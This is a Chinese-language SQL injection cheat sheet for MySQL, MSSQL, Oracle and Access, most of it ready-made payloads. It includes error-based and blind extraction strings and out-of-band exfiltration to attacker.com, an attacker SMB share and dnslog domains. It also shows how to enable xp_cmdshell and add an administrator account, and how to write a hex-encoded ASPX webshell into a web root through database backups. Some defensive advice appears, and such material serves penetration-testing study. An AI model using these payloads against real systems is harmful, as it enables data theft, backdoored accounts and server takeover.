### 概述

SQL注入（SQL Injection）漏洞主要形成的原因是在Web应用程序与数据库进行数据交互时，未能对前端传入后端的数据进行严格的输入验证、过滤或充分转义，导致用户输入的“数据”被错误地解析并拼接到SQL查询语句中，最终被数据库管理系统（DBMS）当作SQL代码的一部分来执行。这种漏洞可能导致严重后果，包括但不限于数据库信息泄露（如用户凭证、个人信息、商业机密）、数据篡改或删除、绕过认证、甚至通过数据库服务器获取操作系统权限，控制整个服务器。

**示例 Payload:**

*   `id=1 or 1=1` (常用于绕过认证或在 `WHERE` 子句中构造永真条件)

### 检测方法

1.  **基础探测:**
    *   **输入异常字符/字符串:** 在参数值后附加看似无意义的字符或字符串，观察响应是否发生变化或报错。例如：`id=1 sadasda`。
    *   **特殊字符探测:** 输入SQL语法中的特殊字符，如单引号 `'`、双引号 `"`、注释符 (`-- `、`#`、`/*...*/`)，观察应用程序的响应。服务器错误、不同的页面内容或延迟都可能是存在漏洞的迹象。
2.  **逻辑判断 (布尔推断):**
    *   构造永真条件：`id=1 and 1=1` 或 `id=1' and '1'='1` (根据推测的闭合方式调整)。预期返回正常结果。
    *   构造永假条件：`id=1 and 1=2` 或 `id=1' and '1'='2`。预期返回与正常不同的结果（如空结果集、特定错误页面或不同的内容）。
    *   如果“真”和“假”条件的响应明显不同，则很可能存在注入点，并且可能是布尔盲注的基础。
3.  **报错探测:**
    *   尝试故意引发数据库语法错误，并观察返回的错误信息。例如，尝试 `UNION SELECT` 但列数不匹配：`id=1 union select 1,2,3`。
    *   数据库的错误信息可能非常有用，有时会直接暴露数据库类型（MySQL, MSSQL, Oracle等）、版本、表结构、甚至是部分查询数据。例如，MSSQL的 `convert` 错误：`id=1 and 1=convert(int, (select @@version))`。
4.  **联合查询探测 (UNION Attack):**
    *   如果页面有数据显示位，可以尝试使用 `UNION SELECT` 来合并额外的查询结果。首先需要确定原始查询的列数（使用 `ORDER BY`），然后构造 `UNION SELECT` 语句在已知显示位上输出信息。

### SQL注入分类

#### 按数据类型/闭合方式分类

1.  **数字型 (Numeric):**
    *   原始查询: `WHERE id = 1`
    *   特点: 参数直接作为数字使用，通常不需要闭合引号。
    *   Payload: `id=1 AND 1=2`, `id=1 UNION SELECT ...`
2.  **字符型 (String):**
    *   原始查询: `WHERE id = '1'` 或 `WHERE id = "1"`
    *   特点: 参数被单引号或双引号包围。需要先闭合引号，然后注入SQL代码，并通常使用注释符处理掉原始查询的剩余部分。
    *   Payload: `id=1' AND '1'='1 --+`, `id=1" UNION SELECT null, version() --+`
3.  **搜索型 (Search/LIKE):**
    *   原始查询: `WHERE column LIKE '%keyword%'`
    *   特点: 参数位于 `LIKE` 子句中，通常被 `%` 和引号包围。需要闭合引号和可能的 `%`。
    *   Payload: `keyword%' AND 1=1 --+`, `keyword%') AND 1=1 --+` (取决于具体实现)
4.  **括号型 (Parenthesized):**
    *   原始查询: `WHERE id = ('1')` 或 `WHERE (column1='a' AND column2='b')` 等不规范或复杂结构。
    *   特点: 参数被括号包围，可能还嵌套引号。需要根据报错信息或代码审计来判断如何正确闭合。
    *   Payload: `1') AND ('1'='1 --+`

#### 按HTTP请求方法分类

SQL注入漏洞可能存在于任何将用户输入传递给后端数据库查询的地方。

1.  **GET请求:**
    *   参数附加在URL后面（Query String），对用户可见，易于测试和修改。受URL编码影响。
    *   示例: `example.com/search?query=test'+OR+1=1--+`
2.  **POST请求:**
    *   参数包含在HTTP请求的主体 (Request Body) 中，用户在浏览器地址栏不可见。不易受URL编码的直接影响（但提交时仍可能被浏览器或框架编码）。
    *   通常需要使用开发者工具或代理工具（如Burp Suite, OWASP ZAP）来拦截和修改请求。
3.  **请求头 (HTTP Headers):**
    *   某些应用程序会将HTTP请求头（如 `Cookie`, `User-Agent`, `Referer`, `X-Forwarded-For` 等）的值用于数据库查询。如果未做处理，这些头字段也可能成为注入点。
    *   示例 (Cookie): `Cookie: session_id=abcde; user_preference=' UNION SELECT password FROM users WHERE id=1 --`
    *   示例 (User-Agent): `User-Agent: Mozilla/5.0' OR 1=1 --`

#### 按攻击技术/效果分类

1.  **联合查询注入 (UNION Attack):**
    *   **概述:** 利用 `UNION` 操作符将两个或多个 `SELECT` 语句的结果集合并为一个结果集。攻击者构造一个与原始查询列数相同的恶意 `SELECT` 语句，从而在应用程序的正常输出中获取额外数据。
    *   **前提:** 原始查询的结果会显示在页面上；攻击者需要知道原始查询的列数（常用 `ORDER BY` 探测）；两个查询的对应列数据类型需要兼容（或使用 `NULL` 占位）。
    *   **关键库/表 (MySQL):**
        *   `information_schema`: 存储数据库元数据（库名、表名、列名等）的系统数据库。
        *   `information_schema.schemata`: 存储所有数据库名称 (`schema_name`)。
        *   `information_schema.tables`: 存储所有表名 (`table_name`) 及其所属数据库 (`table_schema`)。
        *   `information_schema.columns`: 存储所有列名 (`column_name`) 及其所属表 (`table_name`)、库 (`table_schema`)。
        *   `mysql.user`: (旧版本或特定配置) 可能存储数据库用户信息 (`user`, `password` / `authentication_string`)。
    *   **步骤:**
        1.  猜解列数: `id=1' ORDER BY 1 --+`, `id=1' ORDER BY 2 --+`, ... 直到报错。
        2.  确定显示位: `id=1' UNION SELECT 1,2,3 --+` (假设有3列)，观察页面哪个位置显示了1, 2, 或 3。
        3.  获取数据: `id=1' UNION SELECT null, version(), database() --+` (在第二、三列显示版本和库名)。

2.  **报错注入 (Error-based):**
    *   **概述:** 故意构造错误的SQL语句，利用数据库管理系统在处理错误时返回的详细错误信息来提取数据。适用于页面不直接显示查询结果，但会显示数据库错误的情况。
    *   **常用函数 (MySQL):**
        *   `updatexml(XML_document, XPath_string, new_value)`: 通过提供非法的XPath表达式（第二个参数，通常包含要查询的数据）来引发错误。
        *   `extractvalue(XML_frag, XPath_expr)`: 类似 `updatexml`，利用非法XPath报错。
        *   `floor()`: 结合 `rand()`, `count(*)`, `group by` 构造主键/唯一键重复的错误，错误信息中会包含部分查询结果。
    *   **常用辅助函数:** `concat()`, `concat_ws()`, `group_concat()`, `database()`, `version()`, `user()`, `@@datadir`, `limit` 等。
    *   **Payload 示例 (updatexml/extractvalue):**
        ```sql
        -- 爆版本 (假设注入点在 k='...' 处)
        k' or updatexml(1,concat(0x7e,(select @@version),0x7e),1) #
        k' or extractvalue(1,concat(0x7e,(select @@version),0x7e)) #
        -- 爆当前库名
        k' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
        -- 爆指定库 'db_name' 的第一个表名
        k' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='db_name' limit 0,1)),0) #
        -- 爆指定表 'table_name' 的第一个列名
        k' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='table_name' limit 0,1)),0) #
        -- 爆指定表 'users' 的第一个用户密码
        k' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) #
        ```
        *(注: `0x7e` 是 `~` 的十六进制，用于标记结果。`#` 或 `--+` 是注释符)*
    *   **Payload 示例 (floor):**
        ```sql
        select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
        ```
    *   **Payload 示例 (MSSQL `convert`):**
        ```sql
        select * from users where id=1 and 1=convert(int, (select @@version))
        ```
    *   **INSERT/UPDATE 语句报错注入:**
        *   如果注入点在 `INSERT INTO ... VALUES (...)` 或 `UPDATE ... SET col=...` 的值部分。
        *   示例: `INSERT INTO logs (message) VALUES ('Error from user: k' or updatexml(1,concat(0x7e,(select user()),0x7e),1) or'')`
    *   **HTTP头/Cookie 报错注入:**
        *   示例 (User-Agent): `User-Agent: Mozilla' or updatexml(1,concat(0x7e,database()),0) or '`
        *   示例 (Cookie): `Cookie: ant[uname]=admin' and updatexml(1,concat(0x7e,database()),0) #`

3.  **布尔盲注 (Boolean-based Blind):**
    *   **概述:** 当注入点不能直接回显数据或错误信息，但根据SQL查询逻辑真假会返回两种不同的页面响应（例如，“登录成功”/“登录失败”，“用户存在”/“用户不存在”，或者仅仅是页面内容的微小差异）。攻击者通过构造一系列逻辑判断的SQL语句，逐个字符地推断信息。
    *   **常用函数:**
        *   `length(str)`: 获取字符串长度。
        *   `substr(str, pos, len)` / `substring(str, pos, len)` / `mid(str, pos, len)`: 截取子串。
        *   `ascii(char)` / `ord(char)`: 获取字符的ASCII码。
        *   `strcmp(str1, str2)`: 比较字符串。
        *   `if(condition, true_expr, false_expr)`: (也可用于时间盲注)。
    *   **Payload 示例 (假设注入点 `id='...'`):**
        ```sql
        -- 判断是否存在注入 (响应是否不同)
        id=1' and 1=1 #  (真)
        id=1' and 1=2 #  (假)
        -- 猜解数据库名长度
        id=1' and length(database()) = 5 # (如果长度为5则返回真响应)
        id=1' and length(database()) > 5 # (判断长度范围)
        -- 猜解数据库名第一个字符的ASCII码
        id=1' and ascii(substr(database(),1,1)) = 112 # (判断是否为 'p')
        id=1' and ascii(substr(database(),1,1)) > 100 # (判断范围)
        -- 猜解数据库名第一个字符 (直接比较)
        id=1' and substr(database(),1,1) = 'p' #
        ```
    *   **自动化:** 由于过程繁琐，通常使用工具如 Burp Suite Intruder 或 SQLMap 进行自动化猜解。

4.  **时间盲注 (Time-based Blind):**
    *   **概述:** 最“盲”的一种注入方式。无论SQL查询真假，页面都返回完全相同的响应，无法通过内容或状态码判断。攻击者通过注入条件性的延时函数（如 `sleep()` 或 `benchmark()`），如果条件为真，则数据库执行延时操作，导致HTTP响应时间显著增加。通过测量响应时间来判断条件的真假。
    *   **常用函数:**
        *   `sleep(seconds)` (MySQL, PostgreSQL): 使数据库暂停指定秒数。
        *   `pg_sleep(seconds)` (PostgreSQL)
        *   `WAITFOR DELAY '0:0:5'` (MSSQL): 延迟5秒。
        *   `dbms_lock.sleep(seconds)` (Oracle): 延迟。
        *   `benchmark(count, expr)` (MySQL): 重复执行表达式 `count` 次，造成CPU负载和时间延迟。
        *   `if(condition, true_expr, false_expr)`: 结合延时函数使用。
    *   **Payload 示例 (MySQL):**
        ```sql
        -- 判断是否存在注入 (如果存在，页面延迟5秒)
        id=1' and if(1=1, sleep(5), 0) #
        -- 猜解数据库名第一个字符的ASCII码
        id=1' and if(ascii(substr(database(),1,1)) = 112, sleep(5), 0) #
        -- 使用 benchmark 制造延迟
        id=1' AND if(substr(database(),1,1)='p', benchmark(5000000, MD5('A')), 0) #
        ```

5.  **带外通道注入 (Out-of-Band, OOB):**
    *   **概述:** 当服务器无法通过同一连接直接返回数据（如被WAF拦截、无回显、盲注效率低）时，利用数据库服务器的网络功能（如DNS查询、HTTP请求、SMB连接）将数据发送到攻击者控制的外部服务器。攻击者通过监控外部服务器的日志（如DNS日志、HTTP日志）来接收数据。
    *   **前提条件:**
        *   目标数据库服务器能够发起出站网络连接（能访问外网或攻击者控制的内网服务器）。
        *   数据库用户拥有执行相关网络函数的权限（如MySQL的 `load_file()` 用于UNC路径触发DNS/SMB，`SELECT ... INTO OUTFILE` 写SMB共享；MSSQL的 `xp_cmdshell`, `bcp`; Oracle的 `UTL_HTTP`, `UTL_TCP`, `UTL_DNS`）。
        *   (MySQL on Windows with `load_file`) `secure_file_priv` 配置允许加载UNC路径文件（通常需为空 `""`，`NULL`表示禁止）。
    *   **方法:**
        1.  **DNS Exfiltration (DNSLog):**
            *   注册一个DNSLog平台账号（如 `ceye.io`, `dnslog.cn`）获取一个唯一子域名 `your_identifier.dnslog.platform`。
            *   构造Payload，将要查询的数据（如`version()`、`database()`、`hex(data)`）作为子域名拼接到标识符之前。
            *   数据库执行查询时，会尝试解析这个构造的域名，DNS请求记录会被DNSLog平台捕获。
            *   **Payload 示例 (MySQL on Windows using `load_file` with UNC path):**
                ```sql
                -- 发送数据库版本
                select load_file(concat('\\\\',(select version()),'.your_identifier.dnslog.platform\\abc'));
                -- 发送库名 (使用HEX编码防止特殊字符问题)
                select load_file(concat('\\\\',(select hex(database()) limit 0,1),'.your_identifier.dnslog.platform\\abc'));
                ```
            *   **Payload 示例 (Oracle using `UTL_INADDR`):**
                ```sql
                SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance)||'.your_identifier.dnslog.platform') FROM dual;
                ```
            *   **Payload 示例 (MSSQL using `xp_cmdshell`):**
                ```sql
                EXEC master..xp_cmdshell 'ping %COMPUTERNAME%.your_identifier.dnslog.platform'; -- 发送计算机名
                EXEC master..xp_cmdshell 'nslookup (select top 1 name from sysobjects where xtype=''U'').your_identifier.dnslog.platform'; -- 发送第一个用户表名
                ```
        2.  **HTTP Exfiltration:**
            *   构造Payload，使用数据库的网络请求函数（如Oracle的`UTL_HTTP.request`, PostgreSQL的`COPY ... TO PROGRAM 'curl ...'`）向攻击者控制的Web服务器发送HTTP请求，并将数据放在URL参数或POST Body中。
            *   **Payload 示例 (Oracle):**
                ```sql
                SELECT UTL_HTTP.REQUEST('http://attacker.com/log?data='||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual;
                ```
            *   **Payload 示例 (MySQL with UDF, if installed):**
                ```sql
                SELECT http_get(concat('http://attacker.com/log?d=', hex(user())));
                ```
        3.  **SMB Exfiltration:**
            *   (主要适用于Windows环境或配置了SMB客户端的Linux) 利用数据库功能（如MySQL的`SELECT ... INTO OUTFILE '\\\\attacker_ip\\share\\file.txt'`, MSSQL的`xp_cmdshell 'dir > \\\\attacker_ip\\share\\output.txt'`, `bcp ... queryout "\\\\attacker_ip\\share\\data.txt"`) 将数据写入攻击者设置的SMB共享。攻击者通过检查共享文件获取数据。
            *   **Payload 示例 (MySQL):**
                ```sql
                SELECT @@version INTO OUTFILE '\\\\attacker_ip\\share\\version.txt';
                ```
            *   **Payload 示例 (MSSQL `bcp`):**
                ```sql
                EXEC xp_cmdshell 'bcp "SELECT name FROM master.sys.databases" queryout "\\\\attacker_ip\\share\\db_names.txt" -c -T -S localhost';
                ```
    *   **优势:** 隐蔽性高，可绕过仅监控HTTP响应的WAF/IDS，适用于网络隔离或有限连接的环境。
    *   **劣势:** 依赖数据库服务器的网络能力和权限配置，数据传输可能较慢，特殊字符处理复杂（常需编码）。

6.  **二次注入 (Second Order Injection):**
    *   **概述:** 一种更隐蔽的注入方式。攻击者提交的包含恶意SQL代码的数据，在第一次被应用程序处理时，可能被正确地转义或验证，并成功存储到数据库中（此时看起来是无害的“数据”）。之后，当应用程序从数据库中读取这个“可信”的数据，并在另一个SQL查询上下文中**未经再次充分验证或转义**就直接使用时，先前存储的恶意代码被激活并执行，导致SQL注入。
    *   **难点:** 难以通过常规扫描器发现，因为它不直接响应恶意输入，需要理解应用程序的数据流。
    *   **场景举例:**
        1.  **用户名/昵称修改:** 用户将昵称修改为 `Admin'; --`。写入数据库时可能被转义为 `Admin\'; --`。当该用户执行某个操作（如修改密码），后端逻辑可能是从数据库读取昵称用于查询：`UPDATE user_settings SET theme='dark' WHERE username='Admin\'; --' AND user_id=123`。如果读取出的数据没有再次处理，`--` 可能注释掉后续条件，导致意外更新了其他用户的数据。
        2.  **注册与密码重置:** 用户注册名为 `hacker' OR 1=1 --`。注册时写入数据库。当用户请求密码重置，系统可能使用用户名查询：`SELECT email FROM users WHERE username = 'hacker' OR 1=1 --'`。这可能导致返回多个用户的邮箱。
        3.  **订单备注/地址:** 用户在订单备注中输入 `', (select @@version)) --`。存储时正常。当后台生成报表或发货单，如果直接将备注拼接到查询中：`INSERT INTO shipping_labels (order_id, address, note) VALUES (101, '123 Main St', 'Some items', (select @@version)) --')`，就可能执行了恶意代码。
        4.  **书名示例 (来自笔记2):** 用户添加书名为 `Intro to PHP'; DROP TABLE books;--` 的书籍。插入时 `addslashes()` 或类似函数转义了单引号，存储为 `Intro to PHP\'; DROP TABLE books;--`。当管理员在后台编辑这本书的信息时，如果应用程序从数据库取出这个书名，未再次处理就拼接到 `UPDATE` 语句中（例如，用于 `WHERE book_name = '...'` 子句），那么 `DROP TABLE` 命令可能被执行。
    *   **防御:**
        *   **核心原则:** 不信任任何从数据库中取出的数据，即使它之前被存储过。将其视为与外部输入同等级别的不可信数据。
        *   在每次将数据（无论来源）用于构建SQL查询之前，都必须进行严格的验证、清理和转义，或者（最佳实践）始终使用参数化查询。

### 特定注入技术

1.  **宽字节注入 (Wide Byte Injection):**
    *   **原理:** 当数据库连接使用GBK、GB2312等宽字节字符集时，PHP等语言中的某些转义函数（如 `addslashes()`, `mysql_real_escape_string()` 在未正确设置字符集时）会在单引号 `'` (ASCII `0x27`) 前添加反斜杠 `\` (ASCII `0x5c`)，形成 `\'` (`%5c%27`)。攻击者可以在单引号前输入一个大于128的字节（如 `%df`），构成 `%df%5c%27`。数据库在解码时，会将 `%df%5c` 视为一个合法的宽字节字符（如汉字“運”），从而“吃掉”了反斜杠，留下未被转义的单引号 `'`，导致注入。
    *   **条件:**
        *   数据库连接使用了宽字节编码（如 GBK）。
        *   后端代码使用了不当的转义函数，或者 `mysql(i)_real_escape_string` 未配合 `mysql(i)_set_charset` 正确设置连接字符集。
    *   **检测与利用:** 在参数值后尝试添加 `%df'` 或其他 `%[81-FE]'` 组合，观察是否能闭合引号。例如 `id=1%df'`。
    *   **防御:**
        *   统一使用UTF-8编码。
        *   **关键:** 正确设置数据库连接字符集，使其与页面、数据库、表字段编码一致。PHP示例： `mysqli_set_charset($conn, 'utf8mb4');` 或 PDO DSN中指定 `charset=utf8mb4`。
        *   使用 `mysql_real_escape_string()` 时，必须先建立数据库连接并设置好字符集。
        *   在MySQL连接配置中设置 `SET character_set_client=binary`，让MySQL不将客户端数据视为特定编码。
        *   **最佳实践:** 使用参数化查询。

2.  **二次编码注入 (Double Encoding Injection):**
    *   **原理:** Web应用程序在处理用户输入时，可能存在多次（通常是两次）URL解码操作。攻击者可以提交一个经过双重编码的特殊字符。例如，单引号 `'` 的URL编码是 `%27`，`%` 的URL编码是 `%25`。攻击者提交 `%2527`。第一次解码后得到 `%27`。如果此时应用程序执行了基于 `%27` (而非实际单引号) 的安全过滤或转义（可能无效），然后在后续处理中进行了第二次URL解码，`%27` 就变回了单引号 `'`，可能绕过过滤导致注入。
    *   **条件:** 代码中存在不恰当的多次解码流程，且安全过滤发生在第一次解码之后、第二次解码之前。
    *   **检测与利用:** 输入特殊字符的双重URL编码形式，如 `%2527` (代表 `'`), `%2523` (代表 `#`), `%255c` (代表 `\`)。
    *   **防御:** 规范化输入处理流程，确保只在必要时进行解码，并在最终用于SQL查询前进行统一、有效的转义或使用参数化查询。避免在不同阶段重复解码。

3.  **HTTP头注入 (HTTP Header Injection):**
    *   **原理:** 如前所述，当服务器端代码读取 `User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For` 等HTTP头字段，并将其值未经充分处理就拼接到SQL查询中时，攻击者可以通过修改这些请求头发起注入。
    *   **场景:** 用户行为分析、日志记录、基于IP的访问控制、自定义会话管理等。
    *   **利用:** 使用代理工具修改请求头，注入SQL Payload。
        *   `User-Agent: ' OR 1=1; --`
        *   `Cookie: tracking_id=xyz' UNION SELECT password FROM users--`
        *   `X-Forwarded-For: 127.0.0.1'; INSERT INTO logs ... --`
    *   **防御:** 对所有从HTTP请求（包括头字段）获取的数据，在用于SQL查询前执行与处理URL参数或POST数据相同的严格验证、转义或参数化。

4.  **存储过程注入 (Stored Procedure Injection):**
    *   **原理:** 存储过程是预编译并存储在数据库中的一组SQL语句，可以通过名称和参数调用。如果存储过程内部使用了动态SQL（即在过程内部拼接字符串来构建并执行SQL语句），并且将传入的参数直接拼接到动态SQL中而未加处理，那么调用这个存储过程时就可能发生SQL注入。
    *   **易受攻击的示例 (SQL Server):**
        ```sql
        CREATE PROCEDURE sp_getUserData
            @username NVARCHAR(50)
        AS
        BEGIN
            DECLARE @sql NVARCHAR(4000)
            -- 错误：直接拼接未经验证的参数 @username
            SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
            EXEC(@sql) -- 执行动态SQL
        END
        ```
        如果调用 `EXEC sp_getUserData 'admin'' OR ''1''=''1'`，实际执行的SQL将是 `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`。
    *   **防御:**
        *   在存储过程内部**避免使用动态SQL**。尽可能使用静态SQL。
        *   如果必须使用动态SQL，**对传入存储过程的参数进行严格验证和清理**。
        *   在动态SQL中**使用参数化**（例如SQL Server的 `sp_executesql`）。
            ```sql
            CREATE PROCEDURE sp_getUserData_Safe
                @username NVARCHAR(50)
            AS
            BEGIN
                DECLARE @sql NVARCHAR(4000)
                SET @sql = 'SELECT * FROM users WHERE username = @uname'
                -- 使用 sp_executesql 进行参数化执行
                EXEC sp_executesql @sql, N'@uname NVARCHAR(50)', @uname = @username
            END
            ```

5.  **XML 和 JSON 注入:**
    *   **原理:** 当应用程序接收XML或JSON格式的数据，解析后将其中的值用于构建SQL查询时，如果解析出的值未经处理就直接拼接到SQL语句中，可能导致注入。攻击者可以在XML或JSON的字段值中嵌入SQL代码。
    *   **场景:** API接口、Web服务、配置文件处理等。
    *   **示例 (JSON):**
        假设POST请求体为: `{"username": "user", "password": "pwd"}`
        后端代码处理（伪代码）: `query = "SELECT * FROM users WHERE username = '" + jsonData.username + "' AND password = '" + jsonData.password + "'";`
        攻击者发送: `{"username": "admin' -- ", "password": "any"}`
        生成的查询: `SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'any'`，导致认证绕过。
    *   **防御:** 对从XML或JSON解析出的任何数据，在用于SQL查询前，执行与处理其他用户输入相同的验证、转义或参数化。

### 绕过过滤 / WAF 规避技术

Web应用防火墙 (WAF) 或应用程序自身的输入过滤器常常会阻止已知的SQL注入模式。攻击者需要使用各种技巧来绕过这些防御：

1.  **大小写混合:** `SeLeCt`, `UniOn`, `wHeRe` 等。如果过滤规则区分大小写，此法可能有效。
2.  **替换关键字 (使用注释):**
    *   内联注释: `SELECT/*comment*/column FROM/*comment*/table` -> `SELECT column FROM table`
    *   多行注释: `UNION/*`\
        `*/SELECT` (某些数据库)
    *   MySQL特性注释: `/*!UNION*/ SELECT ...` (只有MySQL会执行 `UNION`)，`/*!50000UNION*/ SELECT ...` (MySQL 5.0以上版本执行)
3.  **编码:**
    *   **URL编码:** 将特殊字符（如 `'` -> `%27`, ` ` -> `%20`, `#` -> `%23`）进行URL编码。WAF可能在解码后才进行检查，或者解码不当。双重URL编码 (`'` -> `%2527`) 可用于绕过只进行一次解码的WAF。
    *   **十六进制编码:** `SELECT column FROM table WHERE id=0xdeadbeef`。某些数据库（如MySQL）可以直接在字符串或数字上下文中使用 `0x...` 表示十六进制数据。也可以用 `CONCAT(0x73656c656374)` 构造 'select'。
    *   **Unicode编码:** (主要用于字符串) `N'test'` (SQL Server), `_utf8'test'` (MySQL), 或使用 `CHAR()` / `CHR()` 函数构造。例如 `admin` -> `CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)` (SQL Server) 或 `CHAR(97, 100, 109, 105, 110)` (MySQL)。
4.  **等价函数/符号/语法:**
    *   `AND` -> `&&`
    *   `OR` -> `||`
    *   `=` -> `LIKE`, `REGEXP`, `RLIKE`, `<>`, `>`, `<` (用于布尔判断)
    *   `substr()` -> `substring()`, `mid()`
    *   `ascii()` -> `ord()`
    *   `concat(a,b)` -> `a || b` (Oracle, PostgreSQL), `a + b` (SQL Server)
    *   获取数据库名: `database()` (MySQL) vs `db_name()` (MSSQL) vs `sys.context('userenv','db_name')` (Oracle)
    *   空格替换:
        *   `%20` (URL编码空格)
        *   `+` (URL编码空格的另一种形式，常用于GET参数)
        *   注释: `/**/`
        *   括号: `SELECT(column)FROM(table)` (某些场景)
        *   换行符/制表符: `%0a`, `%0d`, `%09`, `%0b`, `%0c`
        *   特殊空白符: `%a0` (非断行空格)
5.  **绕过引号过滤:**
    *   **数字型注入:** 如果注入点是数字型的，则不需要引号。
    *   **十六进制编码:** 如 `WHERE name=0x61646d696e` (表示 'admin')。
    *   **`CHAR()` 函数:** 如 `WHERE name=CHAR(97, 100, 109, 105, 110)`。
    *   **`CONCAT()` (或其他字符串连接函数):** 结合 `CHAR()` 或已知字符串片段构造目标字符串。
6.  **绕过关键字过滤 (如 `SELECT`, `UNION`, `AND`, `OR`):**
    *   大小写绕过。
    *   注释混淆: `UNI/**/ON SE/**/LECT`。
    *   编码绕过 (见上)。
    *   等价替换 (见上)。
    *   使用堆叠查询 (Stacked Queries) `;` (如果数据库和驱动支持)：`id=1'; DROP TABLE users; --` (极度危险，但常被WAF严格拦截)。
7.  **HTTP参数污染 (HPP - HTTP Parameter Pollution):**
    *   提交同名的参数，例如 `id=1&id=2&id=sleep(5)`。后端应用程序如何处理重复参数（取第一个？最后一个？全部连接？）可能不同，有时可以利用这种差异绕过WAF对单个参数值的检查。
8.  **宽字节注入:** (见上文)

### 特定数据库注入要点

#### Access数据库注入

*   **特点:** 没有 `information_schema`。注入主要靠暴力猜解和利用Access内置函数。不支持注释符 `--` 或 `#`，常用 `%00` (空字节) 截断。
*   **常用探测语句:**
    *   猜表名: `id=1 and exists (select * from admin)` (如果表存在则返回真)
    *   猜列名: `id=1 and exists (select username from admin)` (如果列存在则返回真)
    *   猜列数据类型/长度: `id=1 and (select top 1 len(username) from admin) > 5`
    *   猜列数据内容 (逐字盲注): `id=1 and (select top 1 asc(mid(username,1,1)) from admin) > 97` (猜第一个字符ASCII码)
*   **工具:** 老旧工具如 Havij, Pangolin 可能支持，但需谨慎使用。

#### MSSQL (Microsoft SQL Server) 数据库注入

*   **特点:** 权限体系复杂（`sysadmin`, `db_owner`, `public` 等角色）。功能强大，高权限下可通过存储过程（如 `xp_cmdshell`）执行系统命令。支持堆叠查询 (`;`)。
*   **系统对象:** `sysobjects` (存储数据库对象信息), `syscolumns` (存储列信息), `sys.databases`, `sys.tables`, `sys.columns` (新版)。
*   **权限判断:**
    *   `and 1=(select is_srvrolemember('sysadmin')) --` (判断是否为 sysadmin)
    *   `and 1=(select is_member('db_owner')) --` (判断是否为 db_owner)
    *   `and 1=(select is_member('public')) --`
*   **信息获取:**
    *   版本: `and @@version > 0 --` (利用报错) or `UNION SELECT @@version`
    *   当前用户: `and user > 0 --` (报错) or `UNION SELECT SUSER_SNAME()` or `SYSTEM_USER`
    *   当前库名: `and db_name() > 0 --` (报错) or `UNION SELECT db_name()`
    *   所有库名: `UNION SELECT name FROM master..sysdatabases` or `UNION SELECT name FROM sys.databases`
    *   指定库所有表名: `UNION SELECT name FROM dbname..sysobjects WHERE xtype='U'` or `UNION SELECT table_name FROM dbname.INFORMATION_SCHEMA.TABLES`
    *   指定表所有列名: `UNION SELECT name FROM dbname..syscolumns WHERE id = object_id('tablename')` or `UNION SELECT column_name FROM dbname.INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'`
*   **`xp_cmdshell` 利用 (需要 `sysadmin` 权限):**
    *   检查是否存在/启用: `and 1=(select count(*) from master.dbo.sysobjects where name = 'xp_cmdshell') --`
    *   启用 `xp_cmdshell` (如果被禁用):
        ```sql
        ;exec sp_configure 'show advanced options', 1;reconfigure;exec sp_configure 'xp_cmdshell', 1;reconfigure;--
        ```
    *   执行系统命令:
        ```sql
        ;exec master..xp_cmdshell 'whoami';--
        ;exec master..xp_cmdshell 'net user hacker pass /add & net localgroup administrators hacker /add';--
        ```
*   **DB_OWNER 权限利用 (获取WebShell):**
    *   **思路:** 通常无法直接执行 `xp_cmdshell`。可以利用数据库备份功能（`BACKUP DATABASE`, `BACKUP LOG`）或 `bcp` 工具将包含WebShell代码的数据导出到Web目录下。
    *   **步骤 (备份法):**
        1.  **查找Web目录:** 利用报错信息、配置文件读取（可能需要 `xp_dirtree` 或其他方法）、猜测常见路径。
        2.  **创建包含WebShell的表:**
            ```sql
            create table webshell_tmp (code image); -- image类型可存二进制
            -- ASPX一句话木马 <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%> 的Hex编码
            insert into webshell_tmp (code) values (0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B22636D64225D2C22756E7361666522293B253E);
            ```
        3.  **使用备份导出:** (可能需要数据库恢复模式为 Full 或 Bulk-logged，且之前有完整备份)
            ```sql
            -- 方法一: 日志备份 (需先改恢复模式, 事后改回)
            alter database [数据库名] set recovery full; --
            backup log [数据库名] to disk = 'C:\inetpub\wwwroot\shell.aspx' with init; -- 清空日志并创建文件头
            -- 触发含webshell数据的日志记录操作 (如UPDATE该表)
            backup log [数据库名] to disk = 'C:\inetpub\wwwroot\shell.aspx'; -- 备份含木马的日志
            alter database [数据库名] set recovery simple; -- 改回简单模式
            -- 方法二: 差异备份 (需先有完整备份)
            backup database [数据库名] to disk='C:\inetpub\wwwroot\shell.aspx' with differential, format;
            ```
        4.  **清理:** `drop table webshell_tmp;`
*   **PUBLIC 权限利用:**
    *   权限极低，主要进行信息探测（猜解表名、列名、数据），通常依赖报错注入或盲注。
    *   获取库名: `and db_name()=0 --` (报错)
    *   猜表名 (结合已知系统表排除): `and (select top 1 name from sysobjects where xtype='U' and name not in ('dtproperties',...)) > 0 --`
    *   猜列名 (利用 `having` 和 `group by` 报错): `and 1=1 group by table.col1 having 1=1 --` (如果成功，说明 `table.col1` 存在)

#### MySQL数据库注入

*   **特点:** `information_schema` 数据库是信息获取的核心。权限管理相对直接（用户@主机）。`load_file()` 可读文件，`SELECT ... INTO OUTFILE/DUMPFILE` 可写文件（受 `secure_file_priv` 和文件系统权限限制）。默认不支持堆叠查询（但在某些客户端或API中可能被模拟支持）。
*   **信息获取 (常用函数/变量):**
    *   版本: `version()`, `@@version`
    *   用户: `user()`, `current_user()`, `session_user()`, `system_user()`
    *   库名: `database()`, `schema()`
    *   操作系统: `@@version_compile_os`
    *   数据目录: `@@datadir`
    *   安装目录: `@@basedir`
    *   所有库名: `SELECT schema_name FROM information_schema.schemata`
    *   指定库所有表名: `SELECT table_name FROM information_schema.tables WHERE table_schema='数据库名'` (或 `database()`)
